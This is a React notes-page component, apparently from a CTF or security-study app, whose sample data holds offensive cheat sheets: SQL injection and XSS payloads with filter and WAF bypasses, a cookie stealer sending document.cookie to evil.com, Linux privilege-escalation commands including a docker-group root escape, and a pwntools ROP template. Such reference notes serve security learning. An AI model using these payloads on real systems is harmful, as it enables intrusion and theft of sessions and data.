import { useState } from 'react'
import { FileText, Search, Plus, Trash2, Pin, Tag, Clock } from 'lucide-react'
import Card from '../components/ui/Card.jsx'
import Badge from '../components/ui/Badge.jsx'
import Button from '../components/ui/Button.jsx'

const sampleNotes = [
  {
    id: 1,
    title: 'SQL Injection Cheatsheet',
    category: 'web',
    pinned: true,
    modified: '2 hours ago',
    tags: ['sqli', 'cheatsheet'],
    content: `# SQL Injection Cheatsheet

## Union-Based
\`\`\`sql
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -
\`\`\`

## Error-Based
\`\`\`sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
\`\`\`

## Blind (Boolean)
\`\`\`sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
\`\`\`

## Time-Based
\`\`\`sql
' AND IF(1=1,SLEEP(5),0)-- -
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')-- -
\`\`\`

## WAF Bypass
- Use \`/**/\` instead of spaces
- Double URL encode: \`%2527\`
- Case variation: \`SeLeCt\`
- Inline comments: \`/*!SELECT*/\``,
  },
  {
    id: 2,
    title: 'Linux Privilege Escalation',
    category: 'pwn',
    pinned: true,
    modified: '1 day ago',
    tags: ['privesc', 'linux'],
    content: `# Linux Privilege Escalation

## Quick Wins
- Check sudo permissions: \`sudo -l\`
- Find SUID binaries: \`find / -perm -4000 2>/dev/null\`
- Check cron jobs: \`cat /etc/crontab\`
- Writable /etc/passwd: \`ls -la /etc/passwd\`

## Kernel Exploits
1. Check version: \`uname -r\`
2. Search exploitdb: \`searchsploit linux kernel <version>\`

## GTFOBins
Check for exploitable SUID/sudo binaries at gtfobins.github.io

## Capabilities
\`\`\`bash
getcap -r / 2>/dev/null
\`\`\`

## Docker Escape
If user is in docker group:
\`\`\`bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
\`\`\``,
  },
  {
    id: 3,
    title: 'XSS Payload Collection',
    category: 'web',
    pinned: false,
    modified: '3 days ago',
    tags: ['xss', 'payloads'],
    content: `# XSS Payload Collection

## Basic
\`\`\`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
\`\`\`

## Filter Bypass
\`\`\`html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<details open ontoggle=alert(1)>
\`\`\`

## Cookie Stealer
\`\`\`javascript
fetch('https://evil.com/steal?c='+document.cookie)
\`\`\``,
  },
  {
    id: 4,
    title: 'Binary Exploitation Notes',
    category: 'pwn',
    pinned: false,
    modified: '1 week ago',
    tags: ['binary', 'rop', 'bof'],
    content: `# Binary Exploitation Notes

## Buffer Overflow Steps
1. Find offset: \`pattern_create -l 200\`
2. Control EIP/RIP
3. Find gadgets: \`ROPgadget --binary ./vuln\`
4. Build ROP chain

## Protections
- ASLR: Randomizes addresses
- NX: No execute on stack
- Canary: Stack cookie
- PIE: Position independent

## pwntools Template
\`\`\`python
from pwn import *
p = process('./vuln')
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.sendline(payload)
p.interactive()
\`\`\``,
  },
  {
    id: 5,
    title: 'Reverse Engineering Workflow',
    category: 'rev',
    pinned: false,
    modified: '2 weeks ago',
    tags: ['ghidra', 'gdb', 'reversing'],
    content: `# Reverse Engineering Workflow

## Static Analysis
1. \`file binary\` - identify file type
2. \`strings binary\` - extract strings
3. \`checksec binary\` - check protections
4. Load in Ghidra for decompilation

## Dynamic Analysis
\`\`\`bash
gdb ./binary
> break main
> run
> disas main
> x/20x $rsp
\`\`\`

## Common Patterns
- XOR decryption loops
- Anti-debugging checks
- Custom encoding schemes`,
  },
]

export default function Notes() {
  const [selected, setSelected] = useState(sampleNotes[0])
  const [search, setSearch] = useState('')
  const [editorContent, setEditorContent] = useState(sampleNotes[0].content)

  const filtered = sampleNotes.filter((n) =>
    n.title.toLowerCase().includes(search.toLowerCase()) ||
    n.tags.some((t) => t.toLowerCase().includes(search.toLowerCase()))
  )

  const handleSelect = (note) => {
    setSelected(note)
    setEditorContent(note.content)
  }

  return (
    <div className="flex gap-4 h-[calc(100vh-120px)]">
      {/* Note List */}
      <div className="w-[300px] flex-shrink-0 flex flex-col gap-3">
        <div className="relative">
          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-text-dim" />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search notes..."
            className="w-full bg-slime-card border border-white/[0.06] rounded-lg pl-8 pr-3 py-2.5
              font-mono text-[12px] text-text-primary placeholder:text-text-faint
              focus:bg-slime-code focus:border-mint/15 focus:outline-none transition-colors"
          />
        </div>

        <div className="flex items-center justify-between">
          <span className="font-mono text-[10px] text-text-dim">{filtered.length} notes</span>
          <Button variant="ghost" size="small"><Plus size={12} /> New</Button>
        </div>

        <div className="flex-1 overflow-auto space-y-1">
          {filtered.map((note) => (
            <Card
              key={note.id}
              active={selected.id === note.id}
              onClick={() => handleSelect(note)}
            >
              <div className="flex items-start gap-2">
                {note.pinned && <Pin size={10} className="text-gold mt-1 flex-shrink-0" />}
                <div className="flex-1 min-w-0">
                  <div className="font-heading font-semibold text-[12px] text-text-primary truncate">{note.title}</div>
                  <div className="flex items-center gap-2 mt-1">
                    <Badge category={note.category}>{note.category}</Badge>
                    <div className="flex items-center gap-1">
                      <Clock size={9} className="text-text-faint" />
                      <span className="font-mono text-[8px] text-text-faint">{note.modified}</span>
                    </div>
                  </div>
                  <div className="flex flex-wrap gap-1 mt-1">
                    {note.tags.map((tag) => (
                      <span key={tag} className="font-mono text-[8px] text-text-dim bg-white/[0.04] rounded px-1.5 py-0.5">
                        #{tag}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            </Card>
          ))}
        </div>
      </div>

      {/* Editor Panel */}
      <Card className="flex-1 flex flex-col min-w-0">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <FileText size={16} className="text-mint" />
            <h2 className="font-heading font-bold text-[15px] text-text-primary">{selected.title}</h2>
          </div>
          <div className="flex items-center gap-2">
            <Badge category={selected.category}>{selected.category}</Badge>
            <span className="font-mono text-[9px] text-text-faint">{selected.modified}</span>
          </div>
        </div>
        <textarea
          value={editorContent}
          onChange={(e) => setEditorContent(e.target.value)}
          className="flex-1 bg-slime-code rounded-md border border-white/[0.04] p-4 font-mono text-[11px]
            text-text-secondary resize-none focus:outline-none focus:border-mint/15
            leading-relaxed whitespace-pre-wrap"
          spellCheck={false}
        />
      </Card>
    </div>
  )
}
